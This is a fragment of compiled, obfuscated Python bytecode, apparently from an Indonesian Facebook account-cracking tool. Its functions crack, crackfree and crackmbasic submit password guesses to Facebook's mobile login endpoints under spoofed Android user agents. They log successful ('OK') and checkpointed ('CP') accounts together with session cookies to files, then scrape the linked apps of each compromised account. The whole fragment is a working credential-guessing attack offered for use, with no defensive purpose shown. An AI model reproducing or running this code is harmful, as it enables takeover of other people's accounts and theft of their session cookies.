add;\\\x02}\x16}\x17|\x11d@7\x00}\x11t\x18\xa0-dAt\n|\x13\x83\x01\xa1\x02}\x1at\x18\xa0-d<t\n|\x13\x83\x01\xa1\x02}\x1b|\x1aD\x00]\x17}\x19|\x16d\x157\x00}\x16|\x11d=|\x16\x9b\x00d>|\x19\x9b\x00d\x04|\x1b|\x17\x19\x00\x9b\x00d?\x9d\x077\x00}\x11\x90\x01q\xdft\x06d%t+\x9b\x00d2|\x00\x9b\x00d\'|\t\x9b\x00d$|\x0f\x9b\x00d$|\x11\x9b\x00t$\x9b\x00\x9d\x0b\x83\x01\x01\x00W\x00\x01\x00n\x16n\x02W\x00q@W\x00q@\x04\x00t\x12j.j/\x90\x02y$\x01\x00\x01\x00\x01\x00t0\xa01d\x15\xa1\x01\x01\x00Y\x00q@w\x00t\x03d\x157\x00a\x03d\x00S\x00)BNr\x8f\x00\x00\x00\xfa\x01%u3\x00\x00\x00\r%s\xe2\x9e\xa3 %s/%s \xe2\x9e\xa3\xf0\x9f\x94\xa5-OK:%s \xe2\x9e\xa3\xf0\x9f\x94\xa5-CP:%s \xe2\x9e\xa3 %s%s%sr\xcd\x00\x00\x00\xa9\x01\xda\x03endz\x0em.facebook.comr\x1e\x00\x00\x00\xfa\xdetext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9\xfa\x0bmark.via.gp\xfa\x0bsame-origin\xda\x04cors\xda\x05empty\xda\x08documentz\x17https://m.facebook.com/\xfa\x10gzip, deflate brz5en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5\xa9\r\xda\x04HostrY\x00\x00\x00r\x1d\x00\x00\x00r\\\x00\x00\x00Z\x03dnt\xfa\x10x-requested-with\xfa\x0esec-fetch-site\xfa\x0esec-fetch-mode\xfa\x0esec-fetch-user\xfa\x0esec-fetch-destrW\x00\x00\x00\xfa\x0faccept-encodingrZ\x00\x00\x00z8https://m.facebook.com/login/device-based/password/?uid=z6&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr\xfa\x18name="lsd" value="(.*?)"r\x02\x00\x00\x00\xfa\x1cname="jazoest" value="(.*?)"\xda\x0clogin_no_pinz*https://m.facebook.com/login/save-device/\'\xa9\x06Z\x03lsd\xda\x07jazoestr\xb4\x00\x00\x00Z\x04flow\xda\x04pass\xda\x04nextrV\x00\x00\x00z\x16https://m.facebook.com\xfa!application/x-www-form-urlencodedz7https:/m.facebook.com/login/device-based/password/?uid=\xa9\x0fr\xe4\x00\x00\x00r[\x00\x00\x00rY\x00\x00\x00rX\x00\x00\x00r]\x00\x00\x00r\x1d\x00\x00\x00r\\\x00\x00\x00r\xe5\x00\x00\x00r\xe6\x00\x00\x00r\xe7\x00\x00\x00r\xe8\x00\x00\x00r\xe9\x00\x00\x00rW\x00\x00\x00r\xea\x00\x00\x00rZ\x00\x00\x00zQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDF\xa9\x02rj\x00\x00\x00\xda\x0fallow_redirects\xda\ncheckpointr\xc2\x00\x00\x00r\x8c\x00\x00\x00\xfa\x04\r   u\x07\x00\x00\x00CP \xe2\x9c\x93 \xfa\x04[][]r\x86\x00\x00\x00\xda\x01ar\xa6\x00\x00\x00\xda\x06c_userr\x1d\x00\x00\x00\xfa\xb7SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r\xb8\x00\x00\x00\xfa\x01;c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00\xf3\x1c\x00\x00\x00g\x00|\x00]\n\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x02S\x00\xa9\x01z\x05%s=%sr5\x00\x00\x00\xa9\x03\xda\x02.0\xda\x03key\xda\x05valuer5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00\xda\n<listcomp>N\x02\x00\x00\xf3\x02\x00\x00\x00\x1c\x00z\x19crack.<locals>.<listcomp>\xf5\x07\x00\x00\x00OK \xe2\x9c\x93 r\x8e\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00r\xfd\x00\x00\x00r\xfe\x00\x00\x00r5\x00\x00\x00r\xff\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\x03\x01\x00\x00U\x02\x00\x00r\x04\x01\x00\x00r6\x00\x00\x00\xfa>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive\xa9\x02r?\x00\x00\x00r^\x00\x00\x00\xfa<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activeu.\x00\x00\x00\n[bold green][\xe2\x80\xa2]Active Apps :[/bold green] \n\xfan\\/>\\<div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>\xa9\x02r\x01\x00\x00\x00r\x01\x00\x00\x00\xfa2\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>\xfa\r[bold green][r\x88\x00\x00\x00\xfa\x0e[/bold green]\n\xf55\x00\x00\x00[bold green][\xe2\x80\xa2] Expired Application :[/bold green]\n\xfa;\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>)2r\xc5\x00\x00\x00\xda\x06choicer8\x00\x00\x00\xda\x04loopr\x94\x00\x00\x00r\xc4\x00\x00\x00r\t\x00\x00\x00\xda\x02ok\xda\x02cpr\xb5\x00\x00\x00r\x96\x00\x00\x00r\x98\x00\x00\x00\xda\x03sys\xda\x06stdout\xda\x05flush\xda\x04ugen\xda\x05ugen2\xda\x05ugen3rF\x00\x00\x00r\xb7\x00\x00\x00r^\x00\x00\x00r\x97\x00\x00\x00rG\x00\x00\x00rJ\x00\x00\x00rc\x00\x00\x00rd\x00\x00\x00rf\x00\x00\x00\xda\x04postr?\x00\x00\x00\xda\x08get_dict\xda\x04keysr\xc9\x00\x00\x00r\xa5\x00\x00\x00rE\x00\x00\x00\xda\x05cekerrP\x00\x00\x00\xda\x01NrB\x00\x00\x00r\xd1\x00\x00\x00re\x00\x00\x00r\xc8\x00\x00\x00\xda\x04join\xda\x05itemsrb\x00\x00\x00r\xd0\x00\x00\x00\xda\x07findallrN\x00\x00\x00rO\x00\x00\x00rg\x00\x00\x00rh\x00\x00\x00)\x1cr\xd7\x00\x00\x00r\xd8\x00\x00\x00\xda\x02bi\xda\x04pers\xda\x03fff\xda\x02ua\xda\x03ua2Z\x03ua3r\xb9\x00\x00\x00\xda\x02pw\xda\x01p\xda\x05dataa\xda\x02po\xda\x07headapp\xda\x04coki\xda\x04kuki\xda\x04user\xda\x08infoakun\xda\x07session\xda\x04cek2r\x9c\x00\x00\x00\xda\x08apkAktif\xda\x04hit1\xda\x04hit2\xda\x08apkaktip\xda\x06muncul\xda\rapkKadaluarsa\xda\nkadaluarsar5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\xd5\x00\x00\x00.\x02\x00\x00s\x84\x00\x00\x00\x0c\x02\x10\x01\x04\x016\x01\n\x01\n\x01\n\x01\x08\x01\n\x01\x04\x01(\x01\x14\x016\x014\x01\x10\x01\x12\x01\x08\x01\x12\x01\x0c\x01\x1e\x02 \x01\x12\x01\x08\x01\x08\x01\x14\x01\x08\x01\n\x01\x08\x01\n\x01\x1e\x01$\x010\x01\x06\x01\n\x01\x08\x01\n\x01\x1e\x010\x01\x04\x01\x04\x01\x08\x01\x12\x01\x12\x01\x08\x01\x10\x01\x08\x01\x10\x01\x08\x02\x08\x01$\x01\x08\x02\x08\x01\x10\x01\x10\x01\x08\x01\x08\x01$\x01*\x01\x06\x01\x02\xe5\x04\x1e\x04\xe2\x12\x1f\x0e\x01\x02\xff\x0c\x02r\xd5\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00sT\x04\x00\x00t\x00\xa0\x01t\x02g\x01\xa1\x01}\x02t\x03d\x01\x14\x00t\x04t\x05\x83\x01\x1b\x00}\x03d\x02}\x04t\x06d\x03|\x02t\x03t\x04t\x05\x83\x01t\x07t\x08t\t|\x03\x83\x01t\n|\x04\x83\x01t\x0bf\x08\x16\x00d\x04d\x05\x8d\x02\x01\x00t\x0cj\r\xa0\x0e\xa1\x00\x01\x00t\x00\xa0\x01t\x0f\xa1\x01}\x05t\x00\xa0\x01t\x10\xa1\x01}\x06t\x11\xa0\x12\xa1\x00}\x07|\x01D\x00\x90\x01]\xe7}\x08\x90\x01z\xd3t\x13\xa0\x13\xa1\x00}\t|\x07j\x14\xa0\x15d\x06d\x07|\x06d\x08d\x07d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11\x9c\r\xa1\x01\x01\x00|\x07\xa0\x16d\x12|\x00\x17\x00d\x13\x17\x00\xa1\x01j\x17}\nt\x18\xa0\x19d\x14t\n|\n\x83\x01\xa1\x02\xa0\x1ad\x15\xa1\x01t\x18\xa0\x19d\x16t\n|\n\x83\x01\xa1\x02\xa0\x1ad\x15\xa1\x01|\x00d\x17|\x08d\x18d\x19\x9c\x06}\x0b|\x07j\x14\xa0\x15d\x06d\x1ad\x07d\x1bd\x1c|\x05d\x08d\td\nd\x0bd\x0cd\rd\x12|\x00\x17\x00d\x13\x17\x00d\x0fd\x10d\x1d\x9c\x0f\xa1\x01\x01\x00|\x07j\x1bd\x1e|\x0bd\x1fd \x8d\x03}\x0cd!|\x0cj\x1c\xa0\x1d\xa1\x00\xa0\x1e\xa1\x00v\x00r\xebd"t\x1fv\x00r\xbbt \xa0!|\x00d#\x17\x00|\x08\x17\x00\xa1\x01\x01\x00t"|\x00|\x08\x83\x02\x01\x00n,t\x06d$t#\x9b\x00d%|\x00\x9b\x00d#|\x08\x9b\x00t$\x9b\x00\x9d\x07\x83\x01\x01\x00t%d&t&\x17\x00d\'\x83\x02\xa0\'|\x00d#\x17\x00|\x08\x17\x00d(\x17\x00\xa1\x01\x01\x00t \xa0!|\x00d#\x17\x00|\x08\x17\x00\xa1\x01\x01\x00t\x08d\x157\x00a\x08W\x00\x01\x00\x90\x01n9d)|\x07j\x1c\xa0\x1d\xa1\x00\xa0\x1e\xa1\x00v\x00\x90\x02r\x0fd*d+i\x01}\rd,t(v\x00\x90\x01rCt\x07d\x157\x00a\x07|\x0cj\x1c\xa0\x1d\xa1\x00}\x0ed-\xa0)d.d/\x84\x00|\x07j\x1c\xa0\x1d\xa1\x00\xa0*\xa1\x00D\x00\x83\x01\xa1\x01}\x0ft\x06d$t+\x9b\x00d0|\x00\x9b\x00d#|\x08\x9b\x00d#|\x0f\x9b\x00t$\x9b\x00\x9d\t\x83\x01\x01\x00t%d1t,\x17\x00d\'\x83\x02\xa0\'|\x00d#\x17\x00|\x08\x17\x00d#\x17\x00|\x0f\x17\x00d#\x17\x00|\x05\x17\x00d(\x17\x00\xa1\x01\x01\x00W\x00\x01\x00n\xe1d"t(v\x00\x90\x02r\x0et\x07d\x157\x00a\x07|\x0cj\x1c\xa0\x1d\xa1\x00}\x0ed-\xa0)d2d/\x84\x00|\x07j\x1c\xa0\x1d\xa1\x00\xa0*\xa1\x00D\x00\x83\x01\xa1\x01}\x0ft%d1t,\x17\x00d\'\x83\x02\xa0\'|\x00d#\x17\x00|\x08\x17\x00d#\x17\x00|\x0f\x17\x00d#\x17\x00|\x05\x17\x00d(\x17\x00\xa1\x01\x01\x00|\x00}\x10d3}\x11t\x11\xa0\x12\xa1\x00}\x12|\x12j\x16d4|\x0e|\rd5\x8d\x03j\x17}\x13|\x12j\x16d6|\x0e|\rd5\x8d\x03j\x17}\x14|\x11d77\x00}\x11t\x18\xa0-d8t\n|\x14\x83\x01\xa1\x02}\x15d9\\\x02}\x16}\x17t\x18\xa0-d:t\n|\x13\x83\x01\xa1\x02}\x18|\x15D\x00]\x17}\x19|\x16d\x157\x00}\x16|\x11d;|\x16\x9b\x00d<|\x19\x9b\x00d\x04|\x18|\x17\x19\x00\x9b\x00d=\x9d\x077\x00}\x11\x90\x01q\xacd9\\\x02}\x16}\x17|\x11d>7\x00}\x11t\x18\xa0-d?t\n|\x13\x83\x01\xa1\x02}\x1at\x18\xa0-d:t\n|\x13\x83\x01\xa1\x02}\x1b|\x1aD\x00]\x17}\x19|\x16d\x157\x00}\x16|\x11d;|\x16\x9b\x00d<|\x19\x9b\x00d\x04|\x1b|\x17\x19\x00\x9b\x00d=\x9d\x077\x00}\x11\x90\x01q\xdet\x06d$t+\x9b\x00d0|\x00\x9b\x00d@|\x08\x9b\x00d#|\x0f\x9b\x00d#|\x11\x9b\x00t$\x9b\x00\x9d\x0b\x83\x01\x01\x00W\x00\x01\x00n\x16n\x02W\x00q;W\x00q;\x04\x00t\x11j.j/\x90\x02y#\x01\x00\x01\x00\x01\x00t\x13\xa00dA\xa1\x01\x01\x00Y\x00q;w\x00t\x03d\x157\x00a\x03d\x00S\x00)BNr\x8f\x00\x00\x00r\xd9\x00\x00\x00\xf53\x00\x00\x00\r%s\xe2\x9e\xa3 %s/%s \xe2\x9e\xa3\xf0\x9f\x91\x89-OK:%s \xe2\x9e\xa3\xf0\x9f\x91\x89-CP:%s \xe2\x9e\xa3 %s%s%sr\xcd\x00\x00\x00r\xda\x00\x00\x00z\x11free.facebook.comr\x1e\x00\x00\x00r\xdc\x00\x00\x00r\xdd\x00\x00\x00r\xde\x00\x00\x00r\xdf\x00\x00\x00r\xe0\x00\x00\x00r\xe1\x00\x00\x00z\x1ahttps://free.facebook.com/r\xe2\x00\x00\x00r0\x00\x00\x00r\xe3\x00\x00\x00z;https://free.facebook.com/login/device-based/password/?uid=\xfa)&flow=login_no_pin&refsrc=deprecated&_rdrr\xeb\x00\x00\x00r\x02\x00\x00\x00r\xec\x00\x00\x00r\xed\x00\x00\x00z-https://free.facebook.com/login/save-device/\'r\xee\x00\x00\x00rV\x00\x00\x00z\x19https://free.facebook.comr\xf2\x00\x00\x00r\xf3\x00\x00\x00zFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0Fr\xf4\x00\x00\x00r\xf6\x00\x00\x00r\xc2\x00\x00\x00r\x8c\x00\x00\x00r\xf7\x00\x00\x00u\t\x00\x00\x00CP \xe2\x9c\x93   r\x86\x00\x00\x00r\xf9\x00\x00\x00r\xa6\x00\x00\x00r\xfa\x00\x00\x00r\x1d\x00\x00\x00r\xfb\x00\x00\x00r\xb8\x00\x00\x00r\xfc\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00r\xfd\x00\x00\x00r\xfe\x00\x00\x00r5\x00\x00\x00r\xff\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\x03\x01\x00\x00\x95\x02\x00\x00r\x04\x01\x00\x00z\x1dcrackfree.<locals>.<listcomp>r\x05\x01\x00\x00r\x8e\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00r\xfd\x00\x00\x00r\xfe\x00\x00\x00r5\x00\x00\x00r\xff\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\x03\x01\x00\x00\x9c\x02\x00\x00r\x04\x01\x00\x00r6\x00\x00\x00r\x06\x01\x00\x00r\x07\x01\x00\x00r\x08\x01\x00\x00u#\x00\x00\x00\n[green][\xe2\x80\xa2] Active Apps[/green] \nr\t\x01\x00\x00r\n\x01\x00\x00r\x0b\x01\x00\x00r\x0c\x01\x00\x00r\x88\x00\x00\x00r\r\x01\x00\x00u4\x00\x00\x00[bold green][\xe2\x80\xa2] Expired Application:[/bold green]\nr\x0f\x01\x00\x00r\xf8\x00\x00\x00\xe9\x1f\x00\x00\x00)1r\xc5\x00\x00\x00r\x10\x01\x00\x00r8\x00\x00\x00r\x11\x01\x00\x00r\x94\x00\x00\x00rA\x00\x00\x00r\t\x00\x00\x00r\x12\x01\x00\x00r\x13\x01\x00\x00r\xb5\x00\x00\x00r\x96\x00\x00\x00r\x98\x00\x00\x00r\x14\x01\x00\x00r\x15\x01\x00\x00r\x16\x01\x00\x00r\x17\x01\x00\x00r\x18\x01\x00\x00rF\x00\x00\x00r\xb7\x00\x00\x00rg\x00\x00\x00r^\x00\x00\x00r\x97\x00\x00\x00rG\x00\x00\x00rJ\x00\x00\x00rc\x00\x00\x00rd\x00\x00\x00rf\x00\x00\x00r\x1a\x01\x00\x00r?\x00\x00\x00r\x1b\x01\x00\x00r\x1c\x01\x00\x00r\xc9\x00\x00\x00r\xa5\x00\x00\x00rE\x00\x00\x00r\x1d\x01\x00\x00rP\x00\x00\x00r\x1e\x01\x00\x00rB\x00\x00\x00r\xd1\x00\x00\x00re\x00\x00\x00r\xc8\x00\x00\x00r\x1f\x01\x00\x00r \x01\x00\x00rb\x00\x00\x00r\xd0\x00\x00\x00r!\x01\x00\x00rN\x00\x00\x00rO\x00\x00\x00rh\x00\x00\x00)\x1cr\xd7\x00\x00\x00r\xd8\x00\x00\x00r"\x01\x00\x00r#\x01\x00\x00r$\x01\x00\x00r%\x01\x00\x00r&\x01\x00\x00r\xb9\x00\x00\x00r\'\x01\x00\x00Z\x03tixr(\x01\x00\x00r)\x01\x00\x00r*\x01\x00\x00r+\x01\x00\x00r,\x01\x00\x00r-\x01\x00\x00r.\x01\x00\x00r/\x01\x00\x00r0\x01\x00\x00r1\x01\x00\x00r\x9c\x00\x00\x00r2\x01\x00\x00r3\x01\x00\x00r4\x01\x00\x00r5\x01\x00\x00r6\x01\x00\x00r7\x01\x00\x00r8\x01\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\xd6\x00\x00\x00u\x02\x00\x00s\x84\x00\x00\x00\x0c\x02\x10\x01\x04\x016\x01\n\x01\n\x01\x08\x01\n\x01\x04\x01\x08\x01(\x01\x14\x016\x014\x01\x10\x01\x12\x01\x08\x01\x12\x01\x0c\x01\x1e\x02 \x01\x12\x01\x08\x01\x08\x01\x14\x01\x08\x01\n\x01\x08\x01\n\x01\x1e\x01$\x010\x01\x06\x01\n\x01\x08\x01\n\x01\x1e\x010\x01\x04\x01\x04\x01\x08\x01\x12\x01\x12\x01\x08\x01\x10\x01\x08\x01\x10\x01\x08\x02\x08\x01$\x01\x08\x02\x08\x01\x10\x01\x10\x01\x08\x01\x08\x01$\x01*\x01\x06\x01\x02\xe5\x04\x1e\x04\xe2\x12\x1f\x0e\x01\x02\xff\x0c\x02r\xd6\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00sL\x04\x00\x00t\x00\xa0\x01t\x02g\x01\xa1\x01}\x02t\x03d\x01\x14\x00t\x04t\x05\x83\x01\x1b\x00}\x03d\x02}\x04t\x06d\x03|\x02t\x03t\x04t\x05\x83\x01t\x07t\x08t\t|\x03\x83\x01t\n|\x04\x83\x01t\x0bf\x08\x16\x00d\x04d\x05\x8d\x02\x01\x00t\x0cj\r\xa0\x0e\xa1\x00\x01\x00t\x00\xa0\x01t\x0f\xa1\x01}\x05t\x00\xa0\x01t\x10\xa1\x01}\x06t\x11\xa0\x12\xa1\x00}\x07|\x01D\x00\x90\x01]\xe3}\x08\x90\x01z\xcf|\x07j\x13\xa0\x14d\x06d\x07|\x06d\x08d\x07d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11\x9c\r\xa1\x01\x01\x00|\x07\xa0\x15d\x12|\x00\x17\x00d\x13\x17\x00\xa1\x01j\x16}\tt\x17\xa0\x18d\x14t\n|\t\x83\x01\xa1\x02\xa0\x19d\x15\xa1\x01t\x17\xa0\x18d\x16t\n|\t\x83\x01\xa1\x02\xa0\x19d\x15\xa1\x01|\x00d\x17|\x08d\x18d\x19\x9c\x06}\n|\x07j\x13\xa0\x14d\x06d\x1ad\x07d\x1bd\x1c|\x05d\x1dd\td\nd\x0bd\x0cd\rd\x12|\x00\x17\x00d\x13\x17\x00d\x0fd\x10d\x1e\x9c\x0f\xa1\x01\x01\x00|\x07j\x1ad\x1f|\nd d!\x8d\x03}\x0bd"|\x0bj\x1b\xa0\x1c\xa1\x00\xa0\x1d\xa1\x00v\x00r\xe7d#t\x1ev\x00r\xb7t\x1f\xa0 |\x00d$\x17\x00|\x08\x17\x00\xa1\x01\x01\x00t!|\x00|\x08\x83\x02\x01\x00n,t\x06d%t"\x9b\x00d&|\x00\x9b\x00d\'|\x08\x9b\x00t#\x9b\x00\x9d\x07\x83\x01\x01\x00t$d(t%\x17\x00d)\x83\x02\xa0&|\x00d$\x17\x00|\x08\x17\x00d*\x17\x00\xa1\x01\x01\x00t\x1f\xa0 |\x00d$\x17\x00|\x08\x17\x00\xa1\x01\x01\x00t\x08d\x157\x00a\x08W\x00\x01\x00\x90\x01n9d+|\x07j\x1b\xa0\x1c\xa1\x00\xa0\x1d\xa1\x00v\x00\x90\x02r\x0bd,d-i\x01}\x0cd.t\'v\x00\x90\x01r?t\x07d\x157\x00a\x07|\x0bj\x1b\xa0\x1c\xa1\x00}\rd/\xa0(d0d1\x84\x00|\x07j\x1b\xa0\x1c\xa1\x00\xa0)\xa1\x00D\x00\x83\x01\xa1\x01}\x0et\x06d%t*\x9b\x00d2|\x00\x9b\x00d\'|\x08\x9b\x00d$|\x0e\x9b\x00t#\x9b\x00\x9d\t\x83\x01\x01\x00t$d3t+\x17\x00d)\x83\x02\xa0&|\x00d$\x17\x00|\x08\x17\x00d$\x17\x00|\x0e\x17\x00d$\x17\x00|\x05\x17\x00d*\x17\x00\xa1\x01\x01\x00W\x00\x01\x00n\xe1d#t\'v\x00\x90\x02r\nt\x07d\x157\x00a\x07|\x0bj\x1b\xa0\x1c\xa1\x00}\rd/\xa0(d4d1\x84\x00|\x07j\x1b\xa0\x1c\xa1\x00\xa0)\xa1\x00D\x00\x83\x01\xa1\x01}\x0et$d3t+\x17\x00d)\x83\x02\xa0&|\x00d$\x17\x00|\x08\x17\x00d$\x17\x00|\x0e\x17\x00d$\x17\x00|\x05\x17\x00d*\x17\x00\xa1\x01\x01\x00|\x00}\x0fd5}\x10t\x11\xa0\x12\xa1\x00}\x11|\x11j\x15d6|\r|\x0cd7\x8d\x03j\x16}\x12|\x11j\x15d8|\r|\x0cd7\x8d\x03j\x16}\x13|\x10d97\x00}\x10t\x17\xa0,d:t\n|\x13\x83\x01\xa1\x02}\x14d;\\\x02}\x15}\x16t\x17\xa0,d<t\n|\x12\x83\x01\xa1\x02}\x17|\x14D\x00]\x17}\x18|\x15d\x157\x00}\x15|\x10d=|\x15\x9b\x00d>|\x18\x9b\x00d\x04|\x17|\x16\x19\x00\x9b\x00d?\x9d\x077\x00}\x10\x90\x01q\xa8d;\\\x02}\x15}\x16|\x10d@7\x00}\x10t\x17\xa0,dAt\n|\x12\x83\x01\xa1\x02}\x19t\x17\xa0,d<t\n|\x12\x83\x01\xa1\x02}\x1a|\x19D\x00]\x17}\x18|\x15d\x157\x00}\x15|\x10d=|\x15\x9b\x00d>|\x18\x9b\x00d\x04|\x1a|\x16\x19\x00\x9b\x00d?\x9d\x077\x00}\x10\x90\x01q\xdat\x06d%t*\x9b\x00dB|\x00\x9b\x00d\'|\x08\x9b\x00d$|\x0e\x9b\x00d$|\x10\x9b\x00t#\x9b\x00\x9d\x0b\x83\x01\x01\x00W\x00\x01\x00n\x16n\x02W\x00q;W\x00q;\x04\x00t\x11j-j.\x90\x02y\x1f\x01\x00\x01\x00\x01\x00t/\xa00d\x15\xa1\x01\x01\x00Y\x00q;w\x00t\x03d\x157\x00a\x03d\x00S\x00)CNr\x8f\x00\x00\x00r\xd9\x00\x00\x00r9\x01\x00\x00r\xcd\x00\x00\x00r\xda\x00\x00\x00\xfa\x13mbasic.facebook.comr\x1e\x00\x00\x00z\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r\xdd\x00\x00\x00r\xde\x00\x00\x00r\xdf\x00\x00\x00r\xe0\x00\x00\x00r\xe1\x00\x00\x00z\x1chttps://mbasic.facebook.com/r\xe2\x00\x00\x00r0\x00\x00\x00r\xe3\x00\x00\x00z=https://mbasic.facebook.com/login/device-based/password/?uid=r:\x01\x00\x00r\xeb\x00\x00\x00r\x02\x00\x00\x00r\xec\x00\x00\x00r\xed\x00\x00\x00z/https://mbasic.facebook.com/login/save-device/\'r\xee\x00\x00\x00rV\x00\x00\x00r-\x00\x00\x00r\xf2\x00\x00\x00r\xdc\x00\x00\x00r\xf3\x00\x00\x00zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0Fr\xf4\x00\x00\x00r\xf6\x00\x00\x00r\xc2\x00\x00\x00r\x8c\x00\x00\x00r\xf7\x00\x00\x00u\t\x00\x00\x00 CP \xe2\x9c\x93  r\xf8\x00\x00\x00r\x86\x00\x00\x00r\xf9\x00\x00\x00r\xa6\x00\x00\x00r\xfa\x00\x00\x00r\x1d\x00\x00\x00r\xfb\x00\x00\x00r\xb8\x00\x00\x00r\xfc\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00r\xfd\x00\x00\x00r\xfe\x00\x00\x00r5\x00\x00\x00r\xff\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\x03\x01\x00\x00\xdc\x02\x00\x00r\x04\x01\x00\x00z\x1fcrackmbasic.<locals>.<listcomp>r\x05\x01\x00\x00r\x8e\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00r\xfd\x00\x00\x00r\xfe\x00\x00\x00r5\x00\x00\x00r\xff\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\x03\x01\x00\x00\xe3\x02\x00\x00r\x04\x01\x00\x00r6\x00\x00\x00r\x06\x01\x00\x00r\x07\x01\x00\x00r\x08\x01\x00\x00u!\x00\x00\x00\n[green][\xe2\x80\xa2] Active Apps :[/H] \nr\t\x01\x00\x00r\n\x01\x00\x00r\x0b\x01\x00\x00r\x0c\x01\x00\x00r\x88\x00\x00\x00r\r\x01\x00\x00r\x0e\x01\x00\x00r\x0f\x01\x00\x00u\x08\x00\x00\x00OK \xe2\x9c\x93  )1r\xc5\x00\x00\x00r\x10\x01\x00\x00r8\x00\x00\x00r\x11\x01\x00\x00r\x94\x00\x00\x00rA\x00\x00\x00r\t\x00\x00\x00r\x12\x01\x00\x00r\x13\x01\x00\x00r\xb5\x00\x00\x00r\x96\x00\x00\x00r\x98\x00\x00\x00r\x14\x01\x00\x00r\x15\x01\x00\x00r\x16\x01\x00\x00r\x17\x01\x00\x00r\x18\x01\x00\x00rF\x00\x00\x00r\xb7\x00\x00\x00r^\x00\x00\x00r\x97\x00\x00\x00rG\x00\x00\x00rJ\x00\x00\x00rc\x00\x00\x00rd\x00\x00\x00rf\x00\x00\x00r\x1a\x01\x00\x00r?\x00\x00\x00r\x1b\x01\x00\x00r\x1c\x01\x00\x00r\xc9\x00\x00\x00r\xa5\x00\x00\x00rE\x00\x00\x00r\x1d\x01\x00\x00rP\x00\x00\x00r\x1e\x01\x00\x00rB\x00\x00\x00r\xd1\x00\x00\x00re\x00\x00\x00r\xc8\x00\x00\x00r\x1f\x01\x00\x00r \x01\x00\x00rb\x00\x00\x00r\xd0\x00\x00\x00r!\x01\x00\x00rN\x00\x00\x00rO\x00\x00\x00rg\x00\x00\x00rh\x00\x00\x00)\x1br\xd7\x00\x00\x00r\xd8\x00\x00\x00r"\x01\x00\x00r#\x01\x00\x00r$\x01\x00\x00r%\x01\x00\x00r&\x01\x00\x00r\xb9\x00\x00\x00r\'\x01\x00\x00r(\x01\x00\x00r)\x01\x00\x00r*\x01\x00\x00r+\x01\x00\x00r,\x01\x00\x00r-\x01\x00\x00r.\x01\x00\x00r/\x01\x00\x00r0\x01\x00\x00r1\x01\x00\x00r\x9c\x00\x00\x00r2\x01\x00\x00r3\x01\x00\x00r4\x01\x00\x00r5\x01\x00\x00r6\x01\x00\x00r7\x01\x00\x00r8\x01\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00\xda\x0bcrackmbasic\xbc\x02\x00\x00s\x82\x00\x00\x00\x0c\x02\x10\x01\x04\x016\x01\n\x01\n\x01\x08\x01\n\x01\x04\x01(\x02\x14\x016\x014\x01\x10\x01\x12\x01\x08\x01\x12\x01\x0c\x01\x1e\x02 